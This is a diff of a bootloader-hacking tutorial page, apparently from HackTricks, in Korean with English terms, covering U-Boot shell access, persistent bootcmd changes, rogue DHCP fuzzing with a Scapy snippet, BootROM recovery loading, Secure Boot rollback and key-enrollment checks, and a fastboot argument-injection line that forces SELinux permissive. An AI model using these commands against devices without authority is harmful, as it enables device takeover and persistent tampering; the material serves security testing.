@@ -1,38 +1,38 @@
-# 부트로더 테스트
+# Bootloader Testing
 
 {{#include ../../banners/hacktricks-training.md}}
 
-다음 단계들은 U-Boot 및 UEFI 클래스 로더 같은 부트로더를 테스트하고 장치 시작 구성(startup configurations)을 수정할 때 권장됩니다. 초기 코드 실행 확보, 서명/롤백 보호 평가, 복구 또는 네트워크 부팅 경로 악용에 중점을 두세요.
+다음 단계는 device startup configuration을 수정하고 U-Boot 및 UEFI-class loader와 같은 bootloader를 테스트할 때 권장됩니다. 초기 code execution 확보, signature/rollback protection 평가, recovery 또는 network-boot 경로 악용에 중점을 둡니다.
 
-Related: MediaTek secure-boot bypass via bl2_ext patching:
+Related: bl2_ext patching을 통한 MediaTek secure-boot bypass:
 
 {{#ref}}
 android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 {{#endref}}
 
-## U-Boot 빠른 성공 및 환경 악용
+## U-Boot quick wins 및 environment abuse
 
-1. 인터프리터 셸 접근
-- 부팅 중 `bootcmd`가 실행되기 전에 알려진 중단 키(종종 아무 키, 0, space 또는 보드별 "매직" 시퀀스)를 눌러 U-Boot 프롬프트로 진입하세요.
+1. interpreter shell에 접근
+- boot 중 `bootcmd`가 실행되기 전에 알려진 break key(일반적으로 아무 키, 0, space 또는 board별 "magic" sequence)를 눌러 U-Boot prompt로 진입합니다.
 
-2. 부트 상태 및 변수 검사
-- 유용한 명령:
-- `printenv` (환경 덤프)
-- `bdinfo` (보드 정보, 메모리 주소)
-- `help bootm; help booti; help bootz` (지원되는 커널 부팅 방식)
-- `help ext4load; help fatload; help tftpboot` (사용 가능한 로더)
+2. boot state 및 variables 확인
+- 유용한 commands:
+- `printenv` (environment dump)
+- `bdinfo` (board info, memory addresses)
+- `help bootm; help booti; help bootz` (지원되는 kernel boot methods)
+- `help ext4load; help fatload; help tftpboot` (사용 가능한 loaders)
 
-3. 루트 셸 얻기 위해 부트 인수 수정
-- 커널이 일반 init 대신 셸로 떨어지도록 `init=/bin/sh`를 덧붙이세요:
+3. root shell을 얻도록 boot arguments 수정
+- 일반 init 대신 kernel이 shell로 진입하도록 `init=/bin/sh`를 추가합니다.
 ```
 # printenv
 # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
 # saveenv
-# boot    # or: run bootcmd
+# boot    # 또는: run bootcmd
 ```
 
-4. TFTP 서버에서 Netboot
-- 네트워크를 구성하고 LAN에서 커널/FIT 이미지를 가져오세요:
+4. TFTP server에서 netboot
+- network를 구성하고 LAN에서 kernel/fit image를 가져옵니다.
 ```
 # setenv ipaddr 192.168.2.2      # device IP
 # setenv serverip 192.168.2.1    # TFTP server IP
@@ -44,31 +44,47 @@ android-mediatek-secure-boot-bl2_ext-bypass-el3.md
 # booti ${loadaddr} - ${fdt_addr_r}
 ```
 
-5. 환경을 통해 변경 사항 영구화
-- env 저장소가 쓰기 보호되어 있지 않다면 제어를 영구화할 수 있습니다:
+5. environment를 통한 변경 사항 persist
+- env storage가 write-protected되지 않았다면 control을 persist할 수 있습니다.
 ```
 # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
 # saveenv
 ```
-- fallback 경로에 영향을 주는 `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` 같은 변수를 확인하세요. 잘못 구성된 값은 셸로 반복적으로 진입하도록 허용할 수 있습니다.
+- fallback path에 영향을 주는 `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`와 같은 variables를 확인합니다. 잘못 구성된 값으로 인해 shell로 반복해서 break할 수 있습니다.
 
-6. 디버그/안전하지 않은 기능 확인
-- 다음을 찾아보세요: `bootdelay` > 0, `autoboot` 비활성, 제한 없는 `usb start; fatload usb 0:1 ...`, 시리얼을 통한 `loady`/`loads` 가능성, 신뢰할 수 없는 매체로부터의 `env import`, 서명 검사 없이 로드되는 커널/ramdisk 등.
+6. debug/unsafe features 확인
+- 다음을 확인합니다: `bootdelay` > 0, `autoboot` disabled, 제한 없는 `usb start; fatload usb 0:1 ...`, serial을 통한 `loady`/`loads` 기능, untrusted media에서 `env import`, signature check 없이 로드되는 kernels/ramdisks.
 
-7. U-Boot 이미지/검증 테스트
-- 플랫폼이 FIT 이미지를 사용해 보안/검증 부팅을 주장하면, 서명되지 않았거나 변조된 이미지를 시도하세요:
+7. U-Boot image/verification testing
+- platform이 FIT images를 사용한 secure/verified boot를 지원한다고 주장하면 unsigned 및 tampered images를 모두 시도합니다.
 ```
-# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
-# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
-# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
+# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # FIT sig가 enforced된 경우 FAIL이어야 함
+# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # FAIL이어야 함
+# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # key가 trusted된 경우에만 boot되어야 함
 ```
-- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` 또는 레거시 `verify=n` 동작이 없으면 임의 페이로드를 부팅할 수 있는 경우가 많습니다.
+- `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE`가 없거나 legacy `verify=n` 동작이 존재하면 arbitrary payload를 boot할 수 있는 경우가 많습니다.
+- 단순한 allow/deny 결과에서 멈추지 마세요. 최근 FIT research에 따르면 verification path 자체가 pre-auth attack surface가 될 수 있습니다. externally stored FIT data(`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, overlay / `extra-conf` handling에 대해 negative test를 수행합니다.
+- 일치하는 source tree가 있다면 실제 hardware를 다루기 전에 `test/vboot/vboot_test.sh`를 사용하여 U-Boot sandbox에서 FIT verification behaviour를 빠르게 재현할 수 있습니다.
 
-## Network-boot surface (DHCP/PXE) 및 악성 서버
+8. Standard Boot(`bootstd`), `extlinux` 및 script bootflows
+- 최신 U-Boot builds에서 `bootcmd`는 Standard Boot의 wrapper인 경우가 많습니다. 따라서 visible environment가 안전해 보이더라도 writable media, PXE 또는 SPI flash가 실제 trust boundary가 될 수 있습니다.
+- `extlinux` bootmeth는 `/` 및 `/boot` 아래에서 `extlinux/extlinux.conf`를 검색합니다. script bootmeth는 먼저 `boot.scr.uimg`를 검색한 다음 `boot.scr`를 검색합니다. network boot에서는 script filename이 `boot_script_dhcp`에서 제공될 수 있습니다.
+- 유용한 triage commands:
+```
+# bootflow scan -l
+# bootflow list
+# bootflow select 0; bootflow info -d
+# bootmeth list
+# bootmeth order "extlinux script pxe"
+```
+- 테스트할 abuse cases: `boot_targets`에서 attacker-controlled USB/SD media가 더 앞에 있는 경우, writable `/boot/extlinux/extlinux.conf`, rogue TFTP가 `boot.scr`를 제공하는 경우, `script_offset_f`를 통한 SPI-backed script execution.
+- platform이 FIT verification에 의존한다면 configuration이 image별로만 서명된 것이 아니라 configuration level에서도 서명되었는지 확인합니다. `required-mode=all`은 단일 required key만 허용하는 것보다 강력합니다.
 
-8. PXE/DHCP 매개변수 퍼징
-- U-Boot의 레거시 BOOTP/DHCP 처리는 메모리 안전성 문제를 가졌습니다. 예를 들어, CVE‑2024‑42040는 조작된 DHCP 응답을 통해 U-Boot 메모리에서 바이트를 네트워크로 leak할 수 있는 메모리 노출을 설명합니다. 너무 길거나 엣지케이스 값(option 67 bootfile-name, vendor options, file/servername 필드)으로 DHCP/PXE 코드 경로를 테스트하고 정지나 leak 현상을 관찰하세요.
-- 부트 파라미터 스트레스를 주기 위한 최소한의 Scapy 스니펫:
+## Network-boot surface(DHCP/PXE) 및 rogue servers
+
+9. PXE/DHCP parameter fuzzing
+- U-Boot의 legacy BOOTP/DHCP handling에는 memory-safety issue가 발생한 사례가 있습니다. 예를 들어 CVE-2024-42040은 crafted DHCP responses를 통한 memory disclosure를 설명하며, U-Boot memory의 bytes를 network로 leak할 수 있습니다. 지나치게 길거나 edge-case인 values(option 67 bootfile-name, vendor options, file/servername fields)를 사용하여 DHCP/PXE code paths를 테스트하고 hangs/leaks를 관찰합니다.
+- netboot 중 boot parameters를 stress하기 위한 최소 Scapy snippet:
 ```python
 from scapy.all import *
 offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
@@ -77,70 +93,91 @@ UDP(sport=67, dport=68)/
 BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
 DHCP(options=[('message-type','offer'),
 ('server_id','192.168.2.1'),
-# Intentionally oversized and strange values
+# 의도적으로 oversized하고 이상한 values
 ('bootfile_name','A'*300),
 ('vendor_class_id','B'*240),
 'end']))
 sendp(offer, iface='eth0', loop=1, inter=0.2)
 ```
-- 또한 PXE 파일 이름 필드가 OS 측 프로비저닝 스크립트와 연결될 때 무결성 검증 없이 shell/loader 로직으로 전달되는지 검증하세요.
+- 또한 PXE filename fields가 OS-side provisioning scripts로 chain될 때 sanitization 없이 shell/loader logic으로 전달되는지 검증합니다.
 
-9. 악성 DHCP 서버 명령 인젝션 테스트
-- 악성 DHCP/PXE 서비스를 구성하고 파일 이름 또는 옵션 필드에 문자를 주입해 부트 체인 후단의 명령 인터프리터에 도달할 수 있는지 시도하세요. Metasploit의 DHCP auxiliary, `dnsmasq`, 또는 맞춤형 Scapy 스크립트가 유용합니다. 실험실 네트워크를 격리하는 것을 잊지 마세요.
+10. Rogue DHCP server command injection testing
+- rogue DHCP/PXE service를 설정하고 filename 또는 options fields에 characters를 injection하여 boot chain의 이후 stages에서 command interpreters에 도달할 수 있는지 시도합니다. Metasploit의 DHCP auxiliary, `dnsmasq` 또는 custom Scapy scripts가 적합합니다. 먼저 lab network를 격리해야 합니다.
 
-## 정상 부팅을 무시하는 SoC ROM 복구 모드
+## Normal boot를 override하는 SoC ROM recovery modes
 
-많은 SoC는 BootROM "loader" 모드를 노출하며, 플래시 이미지가 유효하지 않아도 USB/UART를 통해 코드를 수용합니다. secure-boot 퓨즈가 소거되지 않았다면, 이는 체인 초기에 임의 코드 실행을 제공할 수 있습니다.
+많은 SoC는 flash images가 invalid한 경우에도 USB/UART를 통해 code를 받아들이는 BootROM "loader" mode를 제공합니다. secure-boot fuses가 blown되지 않았다면 chain의 매우 초기 단계에서 arbitrary code execution을 제공할 수 있습니다.
 
-- NXP i.MX (Serial Download Mode)
-- 도구: `uuu` (mfgtools3) 또는 `imx-usb-loader`.
-- 예: `imx-usb-loader u-boot.imx`로 커스텀 U-Boot를 RAM에서 실행.
-- Allwinner (FEL)
-- 도구: `sunxi-fel`.
-- 예: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 또는 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
-- Rockchip (MaskROM)
-- 도구: `rkdeveloptool`.
-- 예: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`로 로더를 스테이지하고 커스텀 U-Boot 업로드.
+- NXP i.MX(Serial Download Mode)
+- Tools: `uuu`(mfgtools3) 또는 `imx-usb-loader`.
+- Example: `imx-usb-loader u-boot.imx`를 사용하여 custom U-Boot를 RAM에 push하고 실행합니다.
+- Allwinner(FEL)
+- Tool: `sunxi-fel`.
+- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` 또는 `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
+- Rockchip(MaskROM)
+- Tool: `rkdeveloptool`.
+- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin`을 사용하여 loader를 stage하고 custom U-Boot를 upload합니다.
 
-장치에 secure-boot eFuses/OTP가 소각(burned)되어 있는지 평가하세요. 그렇지 않으면 BootROM 다운로드 모드가 고수준 검증(U-Boot, 커널, rootfs)을 우회하고 SRAM/DRAM에서 직접 귀하의 1차 페이로드를 실행하는 경우가 흔합니다.
+device에 secure-boot eFuses/OTP가 burned되었는지 평가합니다. 그렇지 않다면 BootROM download modes는 첫 번째 stage payload를 SRAM/DRAM에서 직접 실행하여 higher-level verification(U-Boot, kernel, rootfs)을 자주 우회합니다.
 
-## UEFI/PC 클래스 부트로더: 빠른 확인
+## UEFI/PC-class bootloaders: quick checks
 
-10. ESP 변조 및 롤백 테스트
-- EFI System Partition(ESP)을 마운트하고 로더 구성 요소를 확인하세요: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, 벤더 로고 경로 등.
-- Secure Boot revocations (dbx)가 최신이 아니라면 다운그레이드되었거나 알려진 취약 서명된 부트 구성 요소로 부팅을 시도해 보세요. 플랫폼이 오래된 shim/bootmanager를 여전히 신뢰한다면 ESP에서 자체 커널이나 `grub.cfg`를 로드해 지속성을 얻을 수 있습니다.
+11. ESP tampering, rollback 및 key-enrollment testing
+- EFI System Partition(ESP)을 mount하고 loader components를 확인합니다: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
+- 가능한 경우 OS에서 Secure Boot state와 key databases를 dump합니다.
+```bash
+mokutil --sb-state
+efi-readvar -v PK
+efi-readvar -v KEK
+efi-readvar -v db
+efi-readvar -v dbx
+```
+- platform이 Setup Mode에 있거나 unauthenticated key enrollment를 허용하거나 test/default Platform Key(PKfail class)와 함께 제공된다면 local admin 또는 physical attacker가 자신의 KEK/db를 enroll할 수 있습니다. 그러면 Secure Boot가 "enabled"로 보이는 상태를 유지하면서 arbitrary EFI binaries를 boot할 수 있습니다.
+- Secure Boot revocations(dbx)이 최신이 아니라면 downgraded 또는 알려진 vulnerable signed boot components를 사용한 boot를 시도합니다. platform이 여전히 old shims/bootmanagers를 trust한다면 ESP에서 자체 kernel 또는 `grub.cfg`를 로드하여 persistence를 확보할 수 있습니다.
 
-11. 부트 로고 파싱 버그 (LogoFAIL 계열)
-- 여러 OEM/IBV 펌웨어는 부트 로고를 처리하는 DXE의 이미지 파싱 결함에 취약했습니다. 공격자가 ESP의 벤더 특정 경로(예: `\EFI\<vendor>\logo\*.bmp`)에 조작된 이미지를 배치하고 재부팅하면, Secure Boot가 활성화되어 있어도 초기 부팅 중에 코드 실행이 가능할 수 있습니다. 플랫폼이 사용자 제공 로고를 수용하는지, 그리고 해당 경로가 OS에서 쓰기 가능한지 테스트하세요.
+12. Stale shim / SBAT / dbx revocation testing
+- Old Microsoft-signed shims와 vendor forks는 revocations가 stale한 경우에도 BYOVD-style bootkit path로 동작할 수 있습니다. 격리된 lab에서 historically vulnerable한 shim을 ESP에 배치하고 자체 `grubx64.efi` 또는 kernel을 chainload해 봅니다.
+- 빠른 triage:
+```bash
+sbverify --list shimx64.efi
+objdump -s -j .sbat shimx64.efi | less
+efibootmgr -v
+```
+- shim이 revocation list에 있음에도 여전히 실행된다면 firmware/OS에 stale `dbx` updates가 있거나 upstream SBAT protections를 상속하지 않은 forked loader를 trust하는 것입니다.
 
-## Android/Qualcomm ABL + GBL (Android 16) 신뢰 격차
+13. Boot logo parsing bugs(LogoFAIL class)
+- 여러 OEM/IBV firmwares가 boot logos를 처리하는 DXE의 image-parsing flaws에 취약했습니다. attacker가 vendor-specific path(예: `\EFI\<vendor>\logo\*.bmp`) 아래 ESP에 crafted image를 배치하고 reboot할 수 있다면 Secure Boot가 enabled된 경우에도 early boot 중 code execution이 가능할 수 있습니다. platform이 user-supplied logos를 허용하는지, 그리고 해당 paths가 OS에서 writable한지 테스트합니다.
 
-Android 16에서 Qualcomm의 ABL이 **Generic Bootloader Library (GBL)**을 로드하는 경우, ABL이 `efisp` 파티션에서 로드하는 UEFI 앱을 **인증(authenticates)** 하는지 확인하세요. ABL이 단지 UEFI 앱의 **존재(presence)**만 확인하고 서명을 검증하지 않으면, `efisp`에 쓸 수 있는 권한(write primitive)은 부팅 시 **OS 이전의 서명되지 않은 코드 실행(pre-OS unsigned code execution)** 으로 이어질 수 있습니다.
 
-실용적 검사 및 악용 경로:
+## Android/Qualcomm ABL + GBL(Android 16) trust gaps
 
-- **efisp write primitive**: `efisp`에 커스텀 UEFI 앱을 쓰기 위한 방법(root/privileged 서비스, OEM 앱 버그, recovery/fastboot 경로)이 필요합니다. 이것 없이는 GBL 로딩 격차에 직접 접근할 수 없습니다.
-- **fastboot OEM argument injection** (ABL bug): 일부 빌드는 `fastboot oem set-gpu-preemption`에 추가 토큰을 허용하고 이를 커널 cmdline에 추가합니다. 이를 통해 SELinux를 permissive로 강제해 보호된 파티션 쓰기를 가능하게 할 수 있습니다:
+Qualcomm의 ABL을 사용하여 **Generic Bootloader Library(GBL)** 를 로드하는 Android 16 devices에서는 ABL이 `efisp` partition에서 로드하는 UEFI app을 **authenticate**하는지 검증합니다. ABL이 UEFI app의 **presence**만 확인하고 signatures를 verify하지 않는다면 `efisp`에 write primitive를 확보하는 것만으로 **pre-OS unsigned code execution**이 boot 시 가능해집니다.
+
+실용적인 checks 및 abuse paths:
+
+- **efisp write primitive**: custom UEFI app을 `efisp`에 write할 방법이 필요합니다(root/privileged service, OEM app bug, recovery/fastboot path). 이것이 없다면 GBL loading gap에 직접 접근할 수 없습니다.
+- **fastboot OEM argument injection**(ABL bug): 일부 builds는 `fastboot oem set-gpu-preemption`에 추가 tokens를 허용하고 kernel cmdline에 append합니다. 이를 사용하여 permissive SELinux를 강제하고 protected partition writes를 활성화할 수 있습니다.
 ```bash
 fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
 ```
-장치가 패치되어 있으면 명령이 추가 인수를 거부해야 합니다.
-- **영구 플래그를 통한 부트로더 언락**: 부트 단계 페이로드는 persistent unlock 플래그(예: `is_unlocked=1`, `is_unlocked_critical=1`)를 뒤집어 `fastboot oem unlock` 없이도 OEM 서버/승인 없이 언락을 에뮬레이트할 수 있습니다. 이는 다음 재부팅 이후에도 지속되는 변화입니다.
+device가 patched되었다면 command는 extra arguments를 reject해야 합니다.
+- **persistent flags를 통한 Bootloader unlock**: boot-stage payload가 persistent unlock flags(예: `is_unlocked=1`, `is_unlocked_critical=1`)를 변경하여 OEM server/approval gates 없이 `fastboot oem unlock`을 emulate할 수 있습니다. 이는 다음 reboot 이후에도 지속되는 posture change입니다.
 
-방어/분류(triage) 노트:
+Defensive/triage notes:
 
-- ABL이 `efisp`에서 로드되는 GBL/UEFI 페이로드에 대해 서명 검증을 수행하는지 확인하세요. 그렇지 않다면 `efisp`를 높은 위험의 지속성 표면으로 간주하세요.
-- ABL fastboot OEM 핸들러가 인수 개수를 검증하고 추가 토큰을 거부하도록 패치되었는지 추적하세요.
+- ABL이 `efisp`의 GBL/UEFI payload에 대해 signature verification을 수행하는지 확인합니다. 그렇지 않다면 `efisp`를 high-risk persistence surface로 취급합니다.
+- ABL fastboot OEM handlers가 **argument counts를 validate**하고 additional tokens를 reject하도록 patched되었는지 확인합니다.
 
-## 하드웨어 주의
+## Hardware caution
 
-조기 부트 중 SPI/NAND 플래시와 상호작용할 때(예: 읽기를 우회하기 위해 핀을 접지하는 경우) 주의하고 항상 플래시 데이터시트를 참조하세요. 타이밍이 맞지 않는 쇼트는 장치나 프로그래머를 손상시킬 수 있습니다.
+early boot 중 SPI/NAND flash와 상호작용할 때(예: reads를 우회하기 위해 pins를 grounding할 때) 주의하고 항상 flash datasheet를 참조합니다. timing이 맞지 않는 shorts는 device 또는 programmer를 손상시킬 수 있습니다.
 
-## 메모 및 추가 팁
+## Notes and additional tips
 
-- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 시도해 환경 블롭을 RAM과 저장소 간에 이동하세요; 일부 플랫폼은 인증 없이 제거 가능한 매체에서 env를 import할 수 있습니다.
-- 서명이 강제되지 않는 경우 `extlinux.conf`로 부팅하는 Linux 기반 시스템에서는 부트 파티션의 `APPEND` 라인을 수정(`init=/bin/sh` 또는 `rd.break` 삽입)하는 것만으로도 충분할 때가 많습니다.
-- userland에서 `fw_printenv/fw_setenv`를 제공한다면 `/etc/fw_env.config`가 실제 env 저장소와 일치하는지 검증하세요. 잘못된 오프셋은 잘못된 MTD 영역을 읽거나 쓰게 할 수 있습니다.
+- `env export -t ${loadaddr}` 및 `env import -t ${loadaddr}`를 사용하여 RAM과 storage 사이에서 environment blobs를 이동해 봅니다. 일부 platforms는 authentication 없이 removable media에서 env import를 허용합니다.
+- `extlinux.conf`를 통해 boot하는 Linux-based systems에서 boot partition의 `APPEND` line을 수정하여(`init=/bin/sh` 또는 `rd.break`를 injection) signature checks가 enforced되지 않는 경우 persistence를 확보할 수 있습니다.
+- target이 dual-slot / A/B updates를 사용한다면 [firmware analysis overview](README.md)의 anti-rollback 및 slot-desync techniques를 검토하여 bootloader 자체 외부의 updater-only trust gaps를 놓치지 않도록 합니다.
+- userland가 `fw_printenv/fw_setenv`를 제공한다면 `/etc/fw_env.config`가 실제 env storage와 일치하는지 검증합니다. 잘못 구성된 offsets로 인해 잘못된 MTD region을 read/write할 수 있습니다.
 
 ## References
 
@@ -152,4 +189,6 @@ fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
 - [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
 - [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
 - [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
+- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
+- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
 {{#include ../../banners/hacktricks-training.md}}
